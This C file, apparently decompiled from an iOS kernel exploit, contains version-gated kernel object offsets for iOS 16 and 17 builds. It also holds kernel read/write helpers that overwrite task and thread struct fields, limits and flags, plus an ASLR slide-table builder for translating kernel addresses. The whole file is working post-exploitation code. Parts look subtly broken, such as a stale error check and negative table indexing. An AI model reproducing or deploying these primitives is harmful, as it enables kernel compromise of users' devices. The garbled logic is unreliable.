/* record_0x90001_kobj_field_rw.c
 * sub_37a50..sub_38544 — version-gated kobj field offset resolvers,
 * kread/kwrite helpers for task/thread struct fields, vm_allocate
 * staging buffer ops, and ASLR slide table builder.
 */
#include <stdint.h>
#include <stddef.h>
#include <stdlib.h>
#include <string.h>
#include <mach/mach.h>

/* ── extern helpers ─────────────────────────────────────────────── */
extern int  sub_28840(long state, long addr, long *out);
extern int  sub_2572c(long state, long addr, uint32_t sz, void *out);
extern int  sub_2a188(long state, long addr, void *val, int sz);
extern int  sub_2a0d0(long state, long addr, long val);
extern int  sub_295b4(long state, long addr, int *out);
extern int  sub_28dfc(long state, long addr, int val);
extern long sub_1972c(long state, long addr);
extern long sub_32c78(long state, long port);
extern long sub_35004(long state, int mode, long *out, uint32_t *cnt);
extern long sub_38d60(long state, long addr, long buf, uint32_t sz, int fl);
extern long sub_38e4c(long state, long addr, void *val, uint32_t sz, int fl);
extern long sub_1e85c(long h, uint32_t *cnt);

/* forward decls */
static long sub_37c50(long state, uint32_t *o1, int *o2, int *o3, int *o4);
static void sub_37f58(long state, int sel, long *out);
static long sub_38428(long state);

/* ── sub_37c50 — version-gated kobj field offset table ─────────────
 * Fills 4 offsets used by the task/thread kobj field accessors.
 * Returns 0 on success, error code on unsupported build.         */
static long sub_37c50(long state, uint32_t *o1, int *o2, int *o3, int *o4)
{
    uint64_t ver = *(uint64_t *)(state + 0x158);
    int build = *(int *)(state + 0x140);
    uint32_t cap = *(uint32_t *)state;

    int a, b, c, d;

    if (ver > 0x22580a06bfffffULL) {
        int alt = (cap & 0x84000) != 0;
        a = alt ? 0x16c : 0x174;
        b = alt ? 0x210 : 0x280;
        c = alt ? 0x1b4 : 0x224;
        d = alt ? 0x184 : 0x18c;
    } else if (ver > 0x1f530f027fffffULL) {
        int alt = (cap & 0x84000) != 0;
        a = alt ? 0x17c : 0x180;
        b = alt ? 0x220 : 0x290;
        c = alt ? 0x1c4 : 0x230;
        d = 0x194;
    } else if (build == 0x2258 || build == 0x225c) {
        /* iOS 16.x */
        uint32_t sub = cap & 0x518e241u;
        if (sub == 1)       { a = 0x10; }
        else if (sub == 0x200) { a = 0; }
        else if (sub == 0x4000 || sub == 0x80000) { a = 0x20; }
        else if (sub == 0x100000 || sub == 0x1000000) { a = 0x28; }
        else return 0x2802c;
        b = a | 0x200;
        c = a + 0x164;
        d = a + 0x17c;
    } else if (build == 0x2712) {
        /* iOS 17.x */
        uint32_t sub = cap & 0x518e241u;
        if (sub == 0)       { a = 0; }
        else if (sub == 0x4000 || sub == 0x80000) { a = 0x10; }
        else if (sub == 0x100000 || sub == 0x1000000) { a = 0x18; }
        else if (sub == 0x4000000) { a = 0x68; }
        else return 0x2802c;
        b = a | 0x200;
        c = a + 0x164;
        d = a + 0x17c;
    } else if (build == 0x1c1b) {
        int alt = (cap & 0x84000) != 0;
        int new = ver > 0x1c1b19145fffffULL;
        a = new ? (alt ? 0x16c : 0x174) : (alt ? 0xac : 0xac);
        b = new ? (alt ? 0x280 : 0x288) : 0x1c0;
        c = new ? (alt ? 0x22c : 0x234) : (alt ? 0x16c : 0x16c);
        d = new ? (alt ? 0x184 : 0x18c) : (alt ? 0x184 : 0xc4);
    } else if (build == 0x1809) {
        a = 0xac; b = 0x1c0; c = 0x16c; d = 0xc4;
    } else {
        return 0x2802c;
    }

    if (o1) *o1 = (uint32_t)a;
    if (o2) *o2 = b;
    if (o3) *o3 = c;
    if (o4) *o4 = d;
    return 0;
}

/* ── sub_37f58 — get cached kobj handle by selector ─────────────── */
static void sub_37f58(long state, int sel, long *out)
{
    long a = *(long *)(state + 0x248);
    long b = *(long *)(state + 0x250);
    if (!a || !b) {
        uint32_t cnt = 4;
        long tmp = 0;
        long r = sub_35004(state, 2, &tmp, &cnt);
        if ((int)r || cnt < 2) return;
        *(long *)(state + 0x248) = tmp;
        *(long *)(state + 0x250) = tmp; /* second slot from sub_35004 */
    }
    *out = *(long *)(state + (sel == 0 ? 0x248 : 0x250));
}

/* ── sub_37a50 — write kobj field via port kobj + offset table ──────
 * Resolves the kobj for param_2 (port), looks up version-gated
 * offsets, writes param_3 (kobj handle) at field[o1], optionally
 * writes rate/limit fields, and writes a 2-byte flags field.     */
long sub_37a50(long state, long port, long kobj_val, int set_limits, uint16_t flags)
{
    if (!(*(uint32_t *)state & 0x5584201u)) return 0xad008;

    uint32_t o1; int o2, o3, o4;
    long r = sub_37c50(state, &o1, &o2, &o3, &o4);
    if (r) return r;

    long h = 0;
    sub_37f58(state, (int)kobj_val, &h);
    if (r) return r;

    long kobj = sub_32c78(state, port);
    if (!kobj) return 0x2800e;

    long cur = 0;
    if (!sub_28840(state, kobj + o1, &cur)) return 0x2800f;
    if (cur && !sub_1972c(state, cur)) return 0x28026;

    if (!sub_2a0d0(state, kobj + o1, h)) return 0x28010;

    if (set_limits) {
        int v2 = 0, v3 = 0;
        if (!sub_295b4(state, kobj + (uint32_t)o2, &v2)) return 0x2800f;
        if (v2 > 3) return 0x28011;
        if (!sub_295b4(state, kobj + (uint32_t)o3, &v3)) return 0x2800f;
        if (v3 > 12000000) return 0x28011;
        if (!sub_28dfc(state, kobj + (uint32_t)o2, 1)) return 0x28010;
        if (!sub_28dfc(state, kobj + (uint32_t)o3, 12000000)) return 0x28010;
    }

    uint16_t cur_flags = 0;
    if (!sub_2572c(state, kobj + (uint32_t)o4, 2, &cur_flags)) return 0x2800f;
    if (cur_flags >= 0x80) return 0x28011;
    if (!sub_2a188(state, kobj + (uint32_t)o4, &flags, 2)) return 0x28010;
    return 0;
}

/* ── sub_38034 — write kobj field directly into kernel struct ───────
 * Like sub_37a50 but param_2 is already a kernel address (not port).*/
long sub_38034(long state, long kaddr, long kobj_val, int set_limits, uint16_t flags)
{
    if (!(*(uint32_t *)state & 0x5584201u)) return 0xad008;

    uint32_t o1; int o2, o3, o4;
    long r = sub_37c50(state, &o1, &o2, &o3, &o4);
    if (r) return r;

    long h = 0;
    sub_37f58(state, (int)kobj_val, &h);

    long cur = 0;
    if (!sub_28840(state, kaddr + o1, &cur)) return 0x2800f;
    if (cur && !sub_1972c(state, cur)) return 0x28026;

    *(long *)(kaddr + o1) = h; /* direct write into mapped kernel page */

    if (set_limits) {
        if (*(uint32_t *)(kaddr + (uint32_t)o2) > 3) return 0x28011;
        if (*(uint32_t *)(kaddr + (uint32_t)o3) > 12000000) return 0x28011;
        *(uint32_t *)(kaddr + (uint32_t)o2) = 1;
        *(uint32_t *)(kaddr + (uint32_t)o3) = 12000000;
    }

    if (*(uint16_t *)(kaddr + (uint32_t)o4) >= 0x80) return 0x28011;
    *(uint16_t *)(kaddr + (uint32_t)o4) = flags;
    return 0;
}

/* ── sub_38158 — vm_allocate staging + kobj field write ─────────────
 * Allocates a staging page, calls sub_38d60 to copy kernel data in,
 * then writes the kobj field and optional limit fields via sub_38e4c.*/
long sub_38158(long state, long kaddr, long kobj_val, int set_limits, uint16_t flags)
{
    if (!(*(uint32_t *)state & 0x5584201u)) return 0xad008;

    uint32_t o1; int o2, o3, o4;
    long r = sub_37c50(state, &o1, &o2, &o3, &o4);
    if (r) return r;

    long h = 0;
    sub_37f58(state, (int)kobj_val, &h);

    uint32_t sz = *(uint32_t *)(state + 0x180);
    vm_address_t buf = 0;
    kern_return_t kr = vm_allocate(mach_task_self(), &buf, sz, VM_FLAGS_ANYWHERE);
    if (kr) return (long)(kr | 0x80000000u);

    long mask = *(uint64_t *)(state + 0x62 * sizeof(long));
    long r2 = sub_38d60(state, kaddr & ~mask, buf, sz, 1);
    if ((int)r2) { vm_deallocate(mach_task_self(), buf, sz); return r2; }

    long base = (kaddr & mask) + buf;
    long cur = 0;
    if (!sub_28840(state, base + o1, &cur)) { r2 = 0x2800f; goto out; }
    if (cur && !sub_1972c(state, cur)) { r2 = 0x28026; goto out; }

    r2 = sub_38e4c(state, o1 + kaddr, &h, sizeof(h), 1);
    if ((int)r2) goto out;

    if (set_limits) {
        if (*(uint32_t *)(base + (uint32_t)o2) > 3 ||
            *(uint32_t *)(base + (uint32_t)o3) > 12000000) { r2 = 0x28011; goto out; }
        uint32_t v1 = 1, v2 = 12000000;
        r2 = sub_38e4c(state, o2 + kaddr, &v1, 4, 1); if ((int)r2) goto out;
        r2 = sub_38e4c(state, o3 + kaddr, &v2, 4, 1); if ((int)r2) goto out;
    }

    r2 = 0x28011;
    if (*(uint16_t *)(base + (uint32_t)o4) < 0x80)
        r2 = sub_38e4c(state, o4 + kaddr, &flags, 2, 1);

out:
    if (buf && sz) vm_deallocate(mach_task_self(), buf, sz);
    return r2;
}

/* ── sub_38378 — ASLR slide table lookup ────────────────────────────
 * Walks a cached slide-range table (built by sub_38428) to translate
 * a kernel virtual address into a slide-adjusted value.          */
long sub_38378(long state, long base, long slide, uint64_t addr)
{
    if (*(int *)(state + 0x140) > 0x1808) {
        long *tbl = (long *)(state + 0x1a18);
        if (!*tbl && sub_38428(state)) return 0;
        uint32_t cnt = *(uint32_t *)(state + 0x18a0);
        for (uint32_t i = 0; i < cnt; i++) {
            uint64_t lo = (uint64_t)tbl[i * 3 - 2];
            uint64_t hi = lo + (uint64_t)tbl[i * 3];
            if (addr >= lo && addr < hi)
                return (long)((addr - lo) + (uint64_t)tbl[i * 3 - 1]);
        }
    }
    return (base - slide) + (long)addr;
}

/* ── sub_38428 — build ASLR slide-range table ───────────────────────
 * Reads the kext slide table from the kernel via sub_1e85c, then
 * iterates 0x18-byte entries to populate the cached range table.  */
static long sub_38428(long state)
{
    long tbl = *(long *)(state + 0x626);
    if (!tbl) {
        uint32_t cnt = 0;
        tbl = sub_1e85c(*(long *)(state + 0x67e * sizeof(uint32_t)), &cnt);
        if (!tbl || !cnt) return 0xad011;
        *(long *)(state + 0x626) = tbl;
        *(uint32_t *)(state + 0x628) = cnt;
    }
    uint32_t cnt = *(uint32_t *)(state + 0x628);
    if (!cnt) return 0;

    for (uint32_t i = 0; i < cnt; i++) {
        long entry[3] = {0, 0, 0};
        if (!sub_2572c(state, tbl + (long)(i * 0x18), 0x18, entry)) return 0x2800f;
        long shift = entry[2];
        if (*(uint32_t *)state & 0x20) shift <<= 0xe;
        long base = (long)state + (long)(i * 0x18);
        *(long *)(base + 0x1a08) = entry[0];
        *(long *)(base + 0x1a10) = entry[1];
        *(long *)(base + 0x1a18) = shift;
    }
    return 0;
}

/* ── sub_38544 — ASLR slide table lookup (variant) ─────────────────
 * Same as sub_38378 but calls sub_38428 if table not yet built.   */
long sub_38544(long state, long base, long slide, uint64_t addr)
{
    if (*(int *)(state + 0x140) > 0x1808) {
        long *tbl = (long *)(state + 0x1a18);
        if (!*tbl && sub_38428(state)) return 0;
        uint32_t cnt = *(uint32_t *)(state + 0x18a0);
        for (uint32_t i = 0; i < cnt; i++) {
            uint64_t lo = (uint64_t)tbl[i * 3 - 2];
            uint64_t hi = lo + (uint64_t)tbl[i * 3];
            if (addr >= lo && addr < hi)
                return (long)((addr - lo) + (uint64_t)tbl[i * 3 - 1]);
        }
        return 0;
    }
    return (base - slide) + (long)addr;
}
